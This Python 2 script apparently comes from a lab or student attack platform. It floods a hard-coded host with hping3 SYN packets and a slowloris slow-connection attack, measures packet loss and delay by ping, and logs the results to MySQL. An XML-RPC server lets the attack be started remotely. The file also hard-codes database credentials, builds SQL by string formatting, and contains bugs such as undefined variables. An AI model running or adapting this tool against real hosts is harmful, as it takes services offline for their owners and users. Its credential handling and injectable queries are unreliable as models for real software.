#coding=utf-8
import os
import re
import socket
import MySQLdb
from subprocess import Popen, PIPE
import socket, sys, random
from SimpleXMLRPCServer import SimpleXMLRPCServer
import threading
import time,datetime
'''
author:ChenChen
function:tcp attack
input:ip,port,task_id
output:success or not
'''

#写入数据库
def write_to_mysql(task_id, packetlossrate, maxdelay ,averagedelay, lasttime):
    task_id='1'

#连接数据库
    try:
        db = MySQLdb.connect(host="192.168.1.117",user="tcphalf",passwd="hitwh",db="information" ,charset='utf8')
    except:
        print '数据库连接失败!'
    cursor = db.cursor()#获取数据库游标

#根据task_id写入数据库
    try:
        sqls = "update mainpage_tcphalf set packetlossrate = '%s'   where id ='%s' " %(packetlossrate,task_id)
        cursor.execute(sqls)
        sqls = "update mainpage_tcphalf set maxdelay = '%s'   where id ='%s' " %(maxdelay,task_id)
        cursor.execute(sqls)
        sqls = "update mainpage_tcphalf set averagedelay = '%s'   where id ='%s' " %(averagedelay,task_id)
        cursor.execute(sqls)
        sqls = "update mainpage_tcphalf set lasttime = '%s'   where id ='%s' " %(lasttime,task_id)
        cursor.execute(sqls)
        sqls2 = "update mainpage_tcphalf set status='1'  where id ='%s' "%task_id
        cursor.execute(sqls2)
        db.commit()
    except:
        print '写入数据库失败!'
        db.rollback()
    print '写入数据库成功!'
    db.close#关闭数据库


#攻击前配置:防止回复rst包
def prepare(ips):
    order_base='iptables -I INPUT --dst %s -j DROP' %ips
    resp = os.popen(order_base)#进行终端操作


#利用hping3实现tcp半连接攻击,不停发送syn包
def tcp_attack_hping(target, port,task_id):
    orders=' hping3 -i u1 -c 1000 -p %s -S  %s' %(port,target)
    resp = os.popen(orders)
    return 1

#利用slowloris实现慢连接攻击
def tcp_attack_slowloris(target, port):
    orders=' perl slowloris.pl -dns %s -port %s -timeout 200 -num 10000' %(target,port)
    resp = os.popen(orders)
    return 1

#ping 目标主机,以获得延迟
def control(order):
    global packetlossrate, maxdelay ,averagedelay
    orders='ping -c 3 172.29.153.60'
    resp = os.popen(orders)
    string=resp.read()#读取ping结果
    pattern = re.compile(r'=.*?/(.*?)/(.*?)/.*?ms')
    pattern2 = re.compile(r'received, (.*?) packet loss')
    match = pattern.findall(string)#正则表达式匹配
    match2=pattern2.findall(string)
    print string
    packetlossrate=match2[0]#丢包率
    maxdelay=match[0][1]#最大延迟
    averagedelay=match[0][0]#平均延迟
    
#正式开始攻击
def start(target, port,task_id):
    ip = socket.gethostbyname(socket.gethostname())
    orders='ping -c 5 172.29.153.60'
    threads = []#线程队列
    print '目标:%s    端口:%s ' %(targets,ports)
    print '攻击开始!' 
    prepare(ip)
    t1=threading.Thread(target=tcp_attack_slowloris,args=(targets, ports))
    threads.append(t1)#开始慢连接攻击
    for i in range(4):#开始大量syn flood
        t1=threading.Thread(target=tcp_attack_hping,args=(targets, ports,task_ids))
        threads.append(t1)
    t1=threading.Thread(target=control,args=(orders,))
    threads.append(t1)
    d1 = datetime.datetime.now()#计算开始时间
    for t in threads:
        t.setDaemon(True)
        t.start()
    t.join()#守护进程
    d2 = datetime.datetime.now()#结束时间
    d=d2-d1
    lasttime=str(d.seconds)+'s'

    write_to_mysql(task_ids, packetlossrate, maxdelay,averagedelay, lasttime)#写入数据库
    print '丢包率为: %s  最大延迟: %s 平均延迟: %s 所用时间: %s' %( packetlossrate, maxdelay ,averagedelay, lasttime)
    print '攻击成功'
    return 1




if __name__ == '__main__':
    '''
    targets = '172.29.153.60'
    ports = '80'
    task_ids='1'
    start(targets, ports,task_ids)    
    '''
	#RPC协议,远程调用函数
    server=SimpleXMLRPCServer(("192.168.1.113",8888))#绑定本机地址
    server.register_multicall_functions()
    server.register_function(start,'start')#绑定函数
    server.serve_forever()#挂起等待请求
